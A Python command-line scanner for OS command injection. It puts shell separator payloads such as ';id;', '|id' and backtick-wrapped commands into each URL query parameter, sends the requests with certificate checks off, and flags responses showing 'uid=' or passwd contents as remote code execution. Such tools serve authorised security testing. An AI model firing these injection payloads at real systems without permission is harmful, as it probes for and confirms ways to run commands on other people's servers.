import requests
import argparse
import sys
import urllib3
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Common command execution success signatures
CMD_SIGNATURES = [
    "uid=",                  # Linux id command output signature
    "gid=",                  # Linux group id output
    "root:x:",               # Linux passwd check
    "Windows IP Configuration", # Windows ipconfig output
    "Volume in drive"        # Windows dir output
]

def scan_cmd_injection(target_url):
    print("-" * 60)
    print(f"[*] Scanning parameters for OS Command Injection: {target_url}")
    print("-" * 60)
    
    parsed_url = urlparse(target_url)
    query_params = parse_qs(parsed_url.query)
    
    if not query_params:
        print("[-] No query parameters found in URL. Skipping command injection scan.")
        print("-" * 60)
        return

    # Payloads attempting to execute 'id' or 'ipconfig' using separators
    cmd_payloads = [
        ";id;",
        "|id",
        "`id`",
        "&id&",
        ";ipconfig;",
        "&ipconfig&"
    ]
    
    vulnerable = False
    
    for param in query_params:
        print(f"[*] Testing parameter for command execution: '{param}'")
        
        for payload in cmd_payloads:
            test_params = query_params.copy()
            test_params[param] = [payload]
            new_query = urlencode(test_params, doseq=True)
            cmd_url = urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path, parsed_url.params, new_query, parsed_url.fragment))
            
            try:
                resp = requests.get(cmd_url, timeout=5, verify=False, headers={"User-Agent": "Mozilla/5.0"})
                body = resp.text
                
                for sig in CMD_SIGNATURES:
                    if sig in body:
                        print(f"  [!] CRITICAL: OS COMMAND INJECTION / RCE FOUND in parameter '{param}'!")
                        print(f"      Matched execution signature: '{sig}'")
                        print(f"      Exploit Payload URL: {cmd_url}")
                        vulnerable = True
                        break
                if vulnerable:
                    break
            except Exception:
                continue

    if not vulnerable:
        print("[-] No obvious OS command injection vulnerabilities detected.")
    print("-" * 60)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="OS Command Injection Scanner")
    parser.add_argument("url", help="Target URL with parameters (e.g., http://example.com/ping.php?host=127.0.0.1)")
    
    args = parser.parse_args()
    scan_cmd_injection(args.url)
